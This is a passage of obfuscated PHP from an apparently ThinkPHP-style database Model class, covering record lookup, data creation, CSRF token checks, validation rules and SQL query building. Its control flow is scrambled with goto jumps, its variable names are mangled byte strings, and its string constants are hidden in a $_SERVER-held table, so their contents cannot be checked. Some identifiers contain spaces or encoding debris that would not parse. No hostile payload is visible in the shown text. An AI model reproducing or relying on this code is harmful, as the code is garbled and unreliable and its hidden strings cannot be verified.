b²ÉÎÈÎå„; fÇ¼î«ñˆã: if (isset($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[259]]) && is_array($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[259]]) && !empty($DÉÏã¦îÁ) && !isset($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[266]]) && !isset($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[263]])) { foreach ($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[259]] as $fÂ½ºÆß Ó => $FÁ âÉ®Û¿) { $fÂ½ºÆß Ó = trim($fÂ½ºÆß Ó); if (in_array($fÂ½ºÆß Ó, $DÉÏã¦îÁ, !0)) { if (is_scalar($FÁ âÉ®Û¿)) { $this->_parseType($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[259]], $fÂ½ºÆß Ó); } } elseif (!is_numeric($fÂ½ºÆß Ó) && $FĞø¾ŞŒÅÚ[70] != substr($fÂ½ºÆß Ó, 0, 1) && !1 === strpos($fÂ½ºÆß Ó, $FĞø¾ŞŒÅÚ[91]) && !1 === strpos($fÂ½ºÆß Ó, $FĞø¾ŞŒÅÚ[244]) && !1 === strpos($fÂ½ºÆß Ó, $FĞø¾ŞŒÅÚ[267]) && !1 === strpos($fÂ½ºÆß Ó, $FĞø¾ŞŒÅÚ[268])) { unset($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[259]][$fÂ½ºÆß Ó]); } } } $this->_options_filter($d³‘™ØÅ×İ); return $d³‘™ØÅ×İ; goto bŒ³Á©ÃŞ; bŒ³Á©ÃŞ: } protected function _options_filter(&$a¬ª—É¢¶) { } protected function _parseType(&$a”‘°¿ª½, $bá¬ÖÕ‚ƒ—) { $f¬…àÈ“•Ô =& $_SERVER[Õİõş]; if (empty($this->options[$f¬…àÈ“•Ô[269]][$f¬…àÈ“•Ô[4] . $bá¬ÖÕ‚ƒ—])) { $cù°Ü…öÉÕ = strtolower($this->fields[$f¬…àÈ“•Ô[236]][$bá¬ÖÕ‚ƒ—]); if (!1 !== strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[270])) { } elseif (!1 === strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[271]) && !1 !== strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[272])) { $a”‘°¿ª½[$bá¬ÖÕ‚ƒ—] = intval($a”‘°¿ª½[$bá¬ÖÕ‚ƒ—]); } elseif (!1 !== strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[273]) || !1 !== strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[274])) { $a”‘°¿ª½[$bá¬ÖÕ‚ƒ—] = floatval($a”‘°¿ª½[$bá¬ÖÕ‚ƒ—]); } elseif (!1 !== strpos($cù°Ü…öÉÕ, $f¬…àÈ“•Ô[275])) { $a”‘°¿ª½[$bá¬ÖÕ‚ƒ—] = (bool) $a”‘°¿ª½[$bá¬ÖÕ‚ƒ—]; } } } public function find($EÆ‹ó‚¶”Û = array()) { goto eÛ®µ¡º…ö; aë°È³¦Š: if (!empty($this->options[$DàõŠ²Ë„¥[277]])) { return $this->returnResult($this->data, $this->options[$DàõŠ²Ë„¥[277]]); } return $this->data; goto e ²²íŸá‹; eËë¸ãŞø: if (empty($B›‰ï‰¦ø)) { return null; } $this->data = $B›‰ï‰¦ø[0]; $this->_afterFind($this->data, $EÆ‹ó‚¶”Û); goto aë°È³¦Š; eÛ®µ¡º…ö: $DàõŠ²Ë„¥ =& $_SERVER[Õİõş]; if (is_numeric($EÆ‹ó‚¶”Û) || is_string($EÆ‹ó‚¶”Û)) { $bß„¡†¹«š[$this->getPk()] = intval($EÆ‹ó‚¶”Û); $this->options[$DàõŠ²Ë„¥[259]] = $bß„¡†¹«š; } $this->options[$DàõŠ²Ë„¥[276]] = 1; goto AŠñé»¡ã; AŠñé»¡ã: $EÆ‹ó‚¶”Û = $this->_parseOptions(); $B›‰ï‰¦ø = $this->db->select($EÆ‹ó‚¶”Û); if (!1 === $B›‰ï‰¦ø) { return !1; } goto eËë¸ãŞø; e ²²íŸá‹: } protected function _afterFind(&$c”™çŠöÎå, $eï…ÌÈÖ·³) { } protected function returnResult($a÷Êøã”‰, $a¢Öœù«èƒ = '') { $dß¿–™…Õ© =& $_SERVER[Õİõş]; if ($a¢Öœù«èƒ) { if (is_callable($a¢Öœù«èƒ)) { return call_user_func($a¢Öœù«èƒ, $a÷Êøã”‰); } switch (strtolower($a¢Öœù«èƒ)) { case $dß¿–™…Õ©[278]: return json_encode($a÷Êøã”‰); case $dß¿–™…Õ©[279]: return xml_encode($a÷Êøã”‰); } } return $a÷Êøã”‰; } public function parseFieldsMap($aØ´ŞĞíğ, $c„³‰µãÜ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bğóç»Ø¡¹ => $eîÓ‚Ó‡¯Õ) { if ($c„³‰µãÜ == 1) { if (isset($aØ´ŞĞíğ[$eîÓ‚Ó‡¯Õ])) { $aØ´ŞĞíğ[$bğóç»Ø¡¹] = $aØ´ŞĞíğ[$eîÓ‚Ó‡¯Õ]; unset($aØ´ŞĞíğ[$eîÓ‚Ó‡¯Õ]); } } else { if (isset($aØ´ŞĞíğ[$bğóç»Ø¡¹])) { $aØ´ŞĞíğ[$eîÓ‚Ó‡¯Õ] = $aØ´ŞĞíğ[$bğóç»Ø¡¹]; unset($aØ´ŞĞíğ[$bğóç»Ø¡¹]); } } } } return $aØ´ŞĞíğ; } public function setField($fæŒ‡À™ğà, $fê¦»Š¶¾ç = '') { if (is_array($fæŒ‡À™ğà)) { $E¾œ‚¢Š = $fæŒ‡À™ğà; } else { $E¾œ‚¢Š[$fæŒ‡À™ğà] = $fê¦»Š¶¾ç; } return $this->save($E¾œ‚¢Š); } public function setAdd($bè‰±Æé«Ô, $AÑÚÌØÛ­¸ = 1) { $Eâ¨æ‰ÓšÎ =& $_SERVER[Õİõş]; $c¤˜Èë¢‘™ = $bè‰±Æé«Ô . $Eâ¨æ‰ÓšÎ[280] . $AÑÚÌØÛ­¸; if ($AÑÚÌØÛ­¸ < 0) { $c¤˜Èë¢‘™ = $bè‰±Æé«Ô . $AÑÚÌØÛ­¸; } return $this->setField($bè‰±Æé«Ô, array($Eâ¨æ‰ÓšÎ[281], $c¤˜Èë¢‘™)); } public function getField($aÎÏ©‘ƒÀÌ, $fÅ”î—ÌŠ¬ = null) { $a›‚¾‹Á =& $_SERVER[Õİõş]; $CÖÜ¥‚¬ôœ[$a›‚¾‹Á[257]] = $aÎÏ©‘ƒÀÌ; $CÖÜ¥‚¬ôœ = $this->_parseOptions($CÖÜ¥‚¬ôœ); $aÎÏ©‘ƒÀÌ = trim($aÎÏ©‘ƒÀÌ); if (strpos($aÎÏ©‘ƒÀÌ, $a›‚¾‹Á[47])) { if (!isset($CÖÜ¥‚¬ôœ[$a›‚¾‹Á[276]])) { $CÖÜ¥‚¬ôœ[$a›‚¾‹Á[276]] = is_numeric($fÅ”î—ÌŠ¬) ? $fÅ”î—ÌŠ¬ : $a›‚¾‹Á[33]; } $CÄÒóò¸¹¹ = $this->db->select($CÖÜ¥‚¬ôœ); if (!empty($CÄÒóò¸¹¹)) { goto Fœ°ŒÏõ; c…†»ö‘Ô: $cáêì¥‘Ú‘ = array_shift($aÎÏ©‘ƒÀÌ); $b™ÌŞÒ«°Ê = array(); $eÂ´Úò„’Ë = count($e›…Ù±‰òÁ); goto FéƒçîÁä; Fœ°ŒÏõ: $e›…Ù±‰òÁ = explode($a›‚¾‹Á[47], $aÎÏ©‘ƒÀÌ); $aÎÏ©‘ƒÀÌ = array_keys($CÄÒóò¸¹¹[0]); $CÛ¥ÖÚÈíğ = array_shift($aÎÏ©‘ƒÀÌ); goto c…†»ö‘Ô; FéƒçîÁä: foreach ($CÄÒóò¸¹¹ as $E”Ë«·‡¿Ñ) { $F¤Ç…Äİ´ = $E”Ë«·‡¿Ñ[$CÛ¥ÖÚÈíğ]; if (2 == $eÂ´Úò„’Ë) { $b™ÌŞÒ«°Ê[$F¤Ç…Äİ´] = $E”Ë«·‡¿Ñ[$cáêì¥‘Ú‘]; } else { $b™ÌŞÒ«°Ê[$F¤Ç…Äİ´] = is_string($fÅ”î—ÌŠ¬) ? implode($fÅ”î—ÌŠ¬, $E”Ë«·‡¿Ñ) : $E”Ë«·‡¿Ñ; } } return $b™ÌŞÒ«°Ê; goto D‘„Í”Œç‚; D‘„Í”Œç‚: } } else { if (!0 !== $fÅ”î—ÌŠ¬) { $CÖÜ¥‚¬ôœ[$a›‚¾‹Á[276]] = is_numeric($fÅ”î—ÌŠ¬) ? $fÅ”î—ÌŠ¬ : 1; } if ($fÅ”î—ÌŠ¬ === $a›‚¾‹Á[239]) { unset($CÖÜ¥‚¬ôœ[$a›‚¾‹Á[276]]); } $E”Ë«·‡¿Ñ = $this->db->select($CÖÜ¥‚¬ôœ); if (!empty($E”Ë«·‡¿Ñ)) { if ($fÅ”î—ÌŠ¬ === $a›‚¾‹Á[239]) { return reset($E”Ë«·‡¿Ñ[0]); } if (!0 !== $fÅ”î—ÌŠ¬ && 1 == $CÖÜ¥‚¬ôœ[$a›‚¾‹Á[276]]) { return reset($E”Ë«·‡¿Ñ[0]); } foreach ($E”Ë«·‡¿Ñ as $e¡¢ƒˆ’Æ‚) { $fÄÖÍËç¨š[] = $e¡¢ƒˆ’Æ‚[$aÎÏ©‘ƒÀÌ]; } return $fÄÖÍËç¨š; } } return null; } public function create($Eá‘Ù‘Ã© = '', $dÚ›¿¾Í‘ = '') { goto F¥‹¤»­ºÈ; BÃ‘’È»ŒË: if (isset($Dç…Ù¥èÌ)) { if (is_string($Dç…Ù¥èÌ)) { $Dç…Ù¥èÌ = explode($fìö„ï×İ„[47], $Dç…Ù¥èÌ); } if (think_config($fìö„ï×İ„[282])) { $Dç…Ù¥èÌ[] = think_config($fìö„ï×İ„[283]); } foreach ($Eá‘Ù‘Ã© as $BÜ›ŞÕŸê© => $C’åöÈÚÀÊ) { if (!in_array($BÜ›ŞÕŸê©, $Dç…Ù¥èÌ)) { unset($Eá‘Ù‘Ã©[$BÜ›ŞÕŸê©]); } } } if (!$this->autoValidation($Eá‘Ù‘Ã©, $dÚ›¿¾Í‘)) { return !1; } if (!$this->autoCheckToken($Eá‘Ù‘Ã©)) { $this->error = think_lang($fìö„ï×İ„[284]); return !1; } goto Bç±Šª‰Ş; eê˜×À‘²˜: return $Eá‘Ù‘Ã©; goto fªÙí°‚; E©—ÈÊÕ§†: $Eá‘Ù‘Ã© = $this->parseFieldsMap($Eá‘Ù‘Ã©, 0); $dÚ›¿¾Í‘ = $dÚ›¿¾Í‘ ? $dÚ›¿¾Í‘ : (!empty($Eá‘Ù‘Ã©[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$fìö„ï×İ„[257]])) { $Dç…Ù¥èÌ = $this->options[$fìö„ï×İ„[257]]; unset($this->options[$fìö„ï×İ„[257]]); } elseif ($dÚ›¿¾Í‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Dç…Ù¥èÌ = $this->insertFields; } elseif ($dÚ›¿¾Í‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Dç…Ù¥èÌ = $this->updateFields; } goto BÃ‘’È»ŒË; F¥‹¤»­ºÈ: $fìö„ï×İ„ =& $_SERVER[Õİõş]; if (empty($Eá‘Ù‘Ã©)) { $Eá‘Ù‘Ã© = $_POST; } elseif (is_object($Eá‘Ù‘Ã©)) { $Eá‘Ù‘Ã© = get_object_vars($Eá‘Ù‘Ã©); } if (empty($Eá‘Ù‘Ã©) || !is_array($Eá‘Ù‘Ã©)) { $this->error = think_lang($fìö„ï×İ„[255]); return !1; } goto E©—ÈÊÕ§†; Bç±Šª‰Ş: if ($this->autoCheckFields) { $Dç…Ù¥èÌ = $this->getDbFields(); foreach ($Eá‘Ù‘Ã© as $BÜ›ŞÕŸê© => $C’åöÈÚÀÊ) { if (!in_array($BÜ›ŞÕŸê©, $Dç…Ù¥èÌ)) { unset($Eá‘Ù‘Ã©[$BÜ›ŞÕŸê©]); } elseif (MAGIC_QUOTES_GPC && is_string($C’åöÈÚÀÊ)) { $Eá‘Ù‘Ã©[$BÜ›ŞÕŸê©] = stripslashes($C’åöÈÚÀÊ); } } } $this->autoOperation($Eá‘Ù‘Ã©, $dÚ›¿¾Í‘); $this->data = $Eá‘Ù‘Ã©; goto eê˜×À‘²˜; fªÙí°‚: } public function autoCheckToken($eæòˆ‘Óç¤) { $CÊˆÓËßÜß =& $_SERVER[Õİõş]; if (isset($this->options[$CÊˆÓËßÜß[285]]) && !$this->options[$CÊˆÓËßÜß[285]]) { return !0; } if (think_config($CÊˆÓËßÜß[282])) { $Bã’ÜŞÓöª = think_config($CÊˆÓËßÜß[283]); if (!isset($eæòˆ‘Óç¤[$Bã’ÜŞÓöª]) || Session::get($Bã’ÜŞÓöª)) { return !1; } list($B±£ª×ÓÂá, $dòéà£ÂÑÀ) = explode($CÊˆÓËßÜß[70], $eæòˆ‘Óç¤[$Bã’ÜŞÓöª]); if ($dòéà£ÂÑÀ && Session::get($Bã’ÜŞÓöª . $CÊˆÓËßÜß[91] . $B±£ª×ÓÂá) === $dòéà£ÂÑÀ) { Session::remove($Bã’ÜŞÓöª . $CÊˆÓËßÜß[91] . $B±£ª×ÓÂá); return !0; } if (think_config($CÊˆÓËßÜß[286])) { Session::remove($Bã’ÜŞÓöª . $CÊˆÓËßÜß[91] . $B±£ª×ÓÂá); } return !1; } return !0; } public function regex($fğöà–Õ², $FªŒò©Â‹) { $c»”»ëğéŸ =& $_SERVER[Õİõş]; $fßºöšÉ¬½ = array($c»”»ëğéŸ[287] => $c»”»ëğéŸ[288], $c»”»ëğéŸ[289] => $c»”»ëğéŸ[290], $c»”»ëğéŸ[291] => $c»”»ëğéŸ[292], $c»”»ëğéŸ[293] => $c»”»ëğéŸ[294], $c»”»ëğéŸ[295] => $c»”»ëğéŸ[296], $c»”»ëğéŸ[297] => $c»”»ëğéŸ[298], $c»”»ëğéŸ[299] => $c»”»ëğéŸ[300], $c»”»ëğéŸ[274] => $c»”»ëğéŸ[301], $c»”»ëğéŸ[302] => $c»”»ëğéŸ[303]); if (isset($fßºöšÉ¬½[strtolower($FªŒò©Â‹)])) { $FªŒò©Â‹ = $fßºöšÉ¬½[strtolower($FªŒò©Â‹)]; } return preg_match($FªŒò©Â‹, $fğöà–Õ²) === 1; } private function autoOperation(&$FÄÇ¶İµÜù, $d™ß¦‹Æ¦„) { $b‰„¿İÈ¥ =& $_SERVER[Õİõş]; if (!empty($this->options[$b‰„¿İÈ¥[304]])) { $e®Çƒµ‘™ò = $this->options[$b‰„¿İÈ¥[304]]; unset($this->options[$b‰„¿İÈ¥[304]]); } elseif (!empty($this->_auto)) { $e®Çƒµ‘™ò = $this->_auto; } if (isset($e®Çƒµ‘™ò)) { foreach ($e®Çƒµ‘™ò as $E…£‡Á™§) { if (empty($E…£‡Á™§[2])) { $E…£‡Á™§[2] = THINK_MODEL_INSERT; } if ($d™ß¦‹Æ¦„ == $E…£‡Á™§[2] || $E…£‡Á™§[2] == THINK_MODEL_BOTH) { switch (trim($E…£‡Á™§[3])) { case $b‰„¿İÈ¥[305]: case $b‰„¿İÈ¥[306]: $Eæ¾šÏ½âº = isset($E…£‡Á™§[4]) ? (array) $E…£‡Á™§[4] : array(); if (isset($FÄÇ¶İµÜù[$E…£‡Á™§[0]])) { array_unshift($Eæ¾šÏ½âº, $FÄÇ¶İµÜù[$E…£‡Á™§[0]]); } if ($b‰„¿İÈ¥[305] == $E…£‡Á™§[3]) { $FÄÇ¶İµÜù[$E…£‡Á™§[0]] = call_user_func_array($E…£‡Á™§[1], $Eæ¾šÏ½âº); } else { $FÄÇ¶İµÜù[$E…£‡Á™§[0]] = call_user_func_array(array(&$this, $E…£‡Á™§[1]), $Eæ¾šÏ½âº); } break; case $b‰„¿İÈ¥[257]: $FÄÇ¶İµÜù[$E…£‡Á™§[0]] = $FÄÇ¶İµÜù[$E…£‡Á™§[1]]; break; case $b‰„¿İÈ¥[307]: if ($b‰„¿İÈ¥[33] === $FÄÇ¶İµÜù[$E…£‡Á™§[0]]) { unset($FÄÇ¶İµÜù[$E…£‡Á™§[0]]); } break; case $b‰„¿İÈ¥[308]: default: $FÄÇ¶İµÜù[$E…£‡Á™§[0]] = $E…£‡Á™§[1]; } if (!1 === $FÄÇ¶İµÜù[$E…£‡Á™§[0]]) { unset($FÄÇ¶İµÜù[$E…£‡Á™§[0]]); } } } } return $FÄÇ¶İµÜù; } protected function autoValidation($E–®¦ñ·è¬, $bØÑßÚÇñ’) { $BÁîëˆ‰Ê =& $_SERVER[Õİõş]; if (!empty($this->options[$BÁîëˆ‰Ê[309]])) { $aàì½÷³â = $this->options[$BÁîëˆ‰Ê[309]]; unset($this->options[$BÁîëˆ‰Ê[309]]); } elseif (!empty($this->_validate)) { $aàì½÷³â = $this->_validate; } if (isset($aàì½÷³â)) { if ($this->patchValidate) { $this->error = array(); } foreach ($aàì½÷³â as $A‹®˜ÉÍšø => $eÆŠÜ¯İ‹Ğ) { if (empty($eÆŠÜ¯İ‹Ğ[5]) || $eÆŠÜ¯İ‹Ğ[5] == THINK_MODEL_BOTH || $eÆŠÜ¯İ‹Ğ[5] == $bØÑßÚÇñ’) { if (0 == strpos($eÆŠÜ¯İ‹Ğ[2], $BÁîëˆ‰Ê[310]) && strpos($eÆŠÜ¯İ‹Ğ[2], $BÁîëˆ‰Ê[311])) { $eÆŠÜ¯İ‹Ğ[2] = think_lang(substr($eÆŠÜ¯İ‹Ğ[2], 2, -1)); } $eÆŠÜ¯İ‹Ğ[3] = isset($eÆŠÜ¯İ‹Ğ[3]) ? $eÆŠÜ¯İ‹Ğ[3] : THINK_EXISTS_VALIDATE; $eÆŠÜ¯İ‹Ğ[4] = isset($eÆŠÜ¯İ‹Ğ[4]) ? $eÆŠÜ¯İ‹Ğ[4] : $BÁîëˆ‰Ê[312]; switch ($eÆŠÜ¯İ‹Ğ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($E–®¦ñ·è¬, $eÆŠÜ¯İ‹Ğ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($BÁîëˆ‰Ê[33] != trim($E–®¦ñ·è¬[$eÆŠÜ¯İ‹Ğ[0]])) { if (!1 === $this->_validationField($E–®¦ñ·è¬, $eÆŠÜ¯İ‹Ğ)) { return !1; } } break; default: if (isset($E–®¦ñ·è¬[$eÆŠÜ¯İ‹Ğ[0]])) { if (!1 === $this->_validationField($E–®¦ñ·è¬, $eÆŠÜ¯İ‹Ğ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($FÔõ˜¬©ŞÔ, $AÏ®æŞõ‰) { if (!1 === $this->_validationFieldItem($FÔõ˜¬©ŞÔ, $AÏ®æŞõ‰)) { if ($this->patchValidate) { $this->error[$AÏ®æŞõ‰[0]] = $AÏ®æŞõ‰[2]; } else { $this->error = $AÏ®æŞõ‰[2]; return !1; } } return; } protected function _validationFieldItem($fö‚¼¶âß—, $E¤‡„´›Ó) { $f¸Ü¯æß× =& $_SERVER[Õİõş]; switch (strtolower(trim($E¤‡„´›Ó[4]))) { case $f¸Ü¯æß×[305]: case $f¸Ü¯æß×[306]: $a¢±ÕŠ½›• = isset($E¤‡„´›Ó[6]) ? (array) $E¤‡„´›Ó[6] : array(); if (is_string($E¤‡„´›Ó[0]) && strpos($E¤‡„´›Ó[0], $f¸Ü¯æß×[47])) { $E¤‡„´›Ó[0] = explode($f¸Ü¯æß×[47], $E¤‡„´›Ó[0]); } if (is_array($E¤‡„´›Ó[0])) { foreach ($E¤‡„´›Ó[0] as $dâÔ ²‹ñ˜) { $e¬ÕÜ•Ş°[$dâÔ ²‹ñ˜] = $fö‚¼¶âß—[$dâÔ ²‹ñ˜]; } array_unshift($a¢±ÕŠ½›•, $e¬ÕÜ•Ş°); } else { array_unshift($a¢±ÕŠ½›•, $fö‚¼¶âß—[$E¤‡„´›Ó[0]]); } if ($f¸Ü¯æß×[305] == $E¤‡„´›Ó[4]) { return call_user_func_array($E¤‡„´›Ó[1], $a¢±ÕŠ½›•); } else { return call_user_func_array(array(&$this, $E¤‡„´›Ó[1]), $a¢±ÕŠ½›•); } case $f¸Ü¯æß×[313]: return $fö‚¼¶âß—[$E¤‡„´›Ó[0]] == $fö‚¼¶âß—[$E¤‡„´›Ó[1]]; case $f¸Ü¯æß×[314]: if (is_string($E¤‡„´›Ó[0]) && strpos($E¤‡„´›Ó[0], $f¸Ü¯æß×[47])) { $E¤‡„´›Ó[0] = explode($f¸Ü¯æß×[47], $E¤‡„´›Ó[0]); } $AÙÔ›˜‡î£ = array(); if (is_array($E¤‡„´›Ó[0])) { foreach ($E¤‡„´›Ó[0] as $dâÔ ²‹ñ˜) { $AÙÔ›˜‡î£[$dâÔ ²‹ñ˜] = $fö‚¼¶âß—[$dâÔ ²‹ñ˜]; } } else { $AÙÔ›˜‡î£[$E¤‡„´›Ó[0]] = $fö‚¼¶âß—[$E¤‡„´›Ó[0]]; } if (!empty($fö‚¼¶âß—[$this->getPk()])) { $AÙÔ›˜‡î£[$this->getPk()] = array($f¸Ü¯æß×[315], $fö‚¼¶âß—[$this->getPk()]); } if ($this->where($AÙÔ›˜‡î£)->find()) { return !1; } return !0; default: return $this->check($fö‚¼¶âß—[$E¤‡„´›Ó[0]], $E¤‡„´›Ó[1], $E¤‡„´›Ó[4]); } } public function check($Få…ìÀº¸, $FËÍ©çä¦‰, $còÒºóèœ = "\162\145\147\145\x78") { $EÕÓ–Í¸èÖ =& $_SERVER[Õİõş]; $còÒºóèœ = strtolower(trim($còÒºóèœ)); switch ($còÒºóèœ) { case $EÕÓ–Í¸èÖ[7]: case $EÕÓ–Í¸èÖ[316]: $fºíÛë¨â = is_array($FËÍ©çä¦‰) ? $FËÍ©çä¦‰ : explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰); return $còÒºóèœ == $EÕÓ–Í¸èÖ[7] ? in_array($Få…ìÀº¸, $fºíÛë¨â) : !in_array($Få…ìÀº¸, $fºíÛë¨â); case $EÕÓ–Í¸èÖ[317]: case $EÕÓ–Í¸èÖ[318]: if (is_array($FËÍ©çä¦‰)) { $dˆªÙåÁ¡í = $FËÍ©çä¦‰[0]; $a‰ù…é¯²Â = $FËÍ©çä¦‰[1]; } else { list($dˆªÙåÁ¡í, $a‰ù…é¯²Â) = explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰); } return $còÒºóèœ == $EÕÓ–Í¸èÖ[317] ? $Få…ìÀº¸ >= $dˆªÙåÁ¡í && $Få…ìÀº¸ <= $a‰ù…é¯²Â : $Få…ìÀº¸ < $dˆªÙåÁ¡í || $Få…ìÀº¸ > $a‰ù…é¯²Â; case $EÕÓ–Í¸èÖ[319]: case $EÕÓ–Í¸èÖ[320]: return $còÒºóèœ == $EÕÓ–Í¸èÖ[319] ? $Få…ìÀº¸ == $FËÍ©çä¦‰ : $Få…ìÀº¸ != $FËÍ©çä¦‰; case $EÕÓ–Í¸èÖ[321]: $Dîäñæ¤… = mb_strlen($Få…ìÀº¸, $EÕÓ–Í¸èÖ[322]); if (strpos($FËÍ©çä¦‰, $EÕÓ–Í¸èÖ[47])) { list($dˆªÙåÁ¡í, $a‰ù…é¯²Â) = explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰); return $Dîäñæ¤… >= $dˆªÙåÁ¡í && $Dîäñæ¤… <= $a‰ù…é¯²Â; } else { return $Dîäñæ¤… == $FËÍ©çä¦‰; } case $EÕÓ–Í¸èÖ[323]: list($E¦á–õ¸Ò, $cñ½š–š§ó) = explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰); if (!is_numeric($E¦á–õ¸Ò)) { $E¦á–õ¸Ò = strtotime($E¦á–õ¸Ò); } if (!is_numeric($cñ½š–š§ó)) { $cñ½š–š§ó = strtotime($cñ½š–š§ó); } return NOW_TIME >= $E¦á–õ¸Ò && NOW_TIME <= $cñ½š–š§ó; case $EÕÓ–Í¸èÖ[324]: return in_array(get_client_ip(), explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰)); case $EÕÓ–Í¸èÖ[325]: return !in_array(get_client_ip(), explode($EÕÓ–Í¸èÖ[47], $FËÍ©çä¦‰)); case $EÕÓ–Í¸èÖ[312]: default: return $this->regex($Få…ìÀº¸, $FËÍ©çä¦‰); } } public function query($cĞÔˆ„†ŠŞ, $D¬â¹½ô = false) { $DãÎƒ¬Øª¶ =& $_SERVER[Õİõş]; if (!is_bool($D¬â¹½ô) && !is_array($D¬â¹½ô)) { $D¬â¹½ô = func_get_args(); array_shift($D¬â¹½ô); } $cĞÔˆ„†ŠŞ = str_replace(array($DãÎƒ¬Øª¶[213], $DãÎƒ¬Øª¶[326]), $DãÎƒ¬Øª¶[50], $cĞÔˆ„†ŠŞ); $cĞÔˆ„†ŠŞ = $this->parseSql($cĞÔˆ„†ŠŞ, $D¬â¹½ô); return $this->db->query($cĞÔˆ„†ŠŞ); } public function execute($B†ïìäŒ‘…, $f²§ñƒÅÖ = false) { if (!is_bool($f²§ñƒÅÖ) && !is_array($f²§ñƒÅÖ)) { $f²§ñƒÅÖ = func_get_args(); array_shift($f²§ñƒÅÖ); } $B†ïìäŒ‘… = $this->parseSql($B†ïìäŒ‘…, $f²§ñƒÅÖ); return $this->db->execute($B†ïìäŒ‘…); } protected function parseSql($D²¢İ‰©ŸŒ, $bÃ›‚¬É¿) { $a½ã ¡‹¾ö =& $_SERVER[Õİõş]; if (!0 === $bÃ›‚¬É¿) { $bÔ¢Ï•´µÛ = $this->_parseOptions(); $D²¢İ‰©ŸŒ = $this->db->parseSql($D²¢İ‰©ŸŒ, $bÔ¢Ï•´µÛ); } elseif (is_array($bÃ›‚¬É¿)) { $bÃ›‚¬É¿ = array_map(array($this->db, $a½ã ¡‹¾ö[327]), $bÃ›‚¬É¿); $D²¢İ‰©ŸŒ = vsprintf($D²¢İ‰©ŸŒ, $bÃ›‚¬É¿); } else { $D²¢İ‰©ŸŒ = strtr($D²¢İ‰©ŸŒ, array($a½ã ¡‹¾ö[328] => $this->getTableName(), $a½ã ¡‹¾ö[329] => think_config($a½ã ¡‹¾ö[228]))); } $this->db->setModel($this->name); return $D²¢İ‰©ŸŒ; } public function db($DŠÈ¤äÌ¬ = '', $EÖàÈÁì½ = '', $cÃù­ÁÀ¡ = array()) { goto C§Á¾îøİí; C§Á¾îøİí: $e·®öÊ‚© =& $_SERVER[Õİõş]; if ($e·®öÊ‚©[33] === $DŠÈ¤äÌ¬ && $this->db) { return $this->db; } static $AŒ²à§«ˆ = array(); goto C‰ù³ª…ŞÒ; aŒ…¼–‚™: $AŒ²à§«ˆ[$DŠÈ¤äÌ¬] = $EÖàÈÁì½; $this->db = $Aí·¶Ô‰›[$DŠÈ¤äÌ¬]; $this->_after_db(); goto cèŠÔÄ©‚; cèŠÔÄ©‚: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto EšÓè·í²; C‰ù³ª…ŞÒ: static $Aí·¶Ô‰› = array(); if (!isset($Aí·¶Ô‰›[$DŠÈ¤äÌ¬]) || isset($Aí·¶Ô‰›[$DŠÈ¤äÌ¬]) && $EÖàÈÁì½ && $AŒ²à§«ˆ[$DŠÈ¤äÌ¬] != $EÖàÈÁì½) { if (!empty($EÖàÈÁì½) && is_string($EÖàÈÁì½) && !1 === strpos($EÖàÈÁì½, $e·®öÊ‚©[8])) { $EÖàÈÁì½ = think_config($EÖàÈÁì½); } $Aí·¶Ô‰›[$DŠÈ¤äÌ¬] = Db::getInstance($EÖàÈÁì½); } elseif (NULL === $EÖàÈÁì½) { $Aí·¶Ô‰›[$DŠÈ¤äÌ¬]->close(); unset($Aí·¶Ô‰›[$DŠÈ¤äÌ¬]); return; } if (!empty($cÃù­ÁÀ¡)) { if (is_string($cÃù­ÁÀ¡)) { parse_str($cÃù­ÁÀ¡, $cÃù­ÁÀ¡); } foreach ($cÃù­ÁÀ¡ as $fËäôì•ò => $aêÄßÄÜ) { $this->setProperty($fËäôì•ò, $aêÄßÄÜ); } } goto aŒ…¼–‚™; EšÓè·í²: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Cá‘Æéƒê = get_class($this); if ($Cá‘Æéƒê == $_SERVER[Õİõş][330]) { return $this->name; } $this->name = substr($Cá‘Æéƒê, 0, -5); } return $this->name; } public function getTableName() { $B«”ßÕÛá =& $_SERVER[Õİõş]; if (empty($this->trueTableName)) { $E•âª…²é = !empty($this->tablePrefix) ? $this->tablePrefix : $B«”ßÕÛá[33]; if (!empty($this->tableName)) { $E•âª…²é .= $this->tableName; } else { $E•âª…²é .= think_parse_name($this->name); } $this->trueTableName = strtolower($E•âª…²é); } return (!empty($this->dbName) ? $this->dbName . $B«”ßÕÛá[91] : $B«”ßÕÛá[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F•è¾ğôå =& $_SERVER[Õİõş]; return isset($this->fields[$F•è¾ğôå[235]]) ? $this->fields[$F•è¾ğôå[235]] : $this->pk; } public function getDbFields() { $C¤—¯§ò¶ =& $_SERVER[Õİõş]; if (isset($this->options[$C¤—¯§ò¶[263]])) { $a·¥äÆ = $this->db->getFields($this->options[$C¤—¯§ò¶[263]]); return 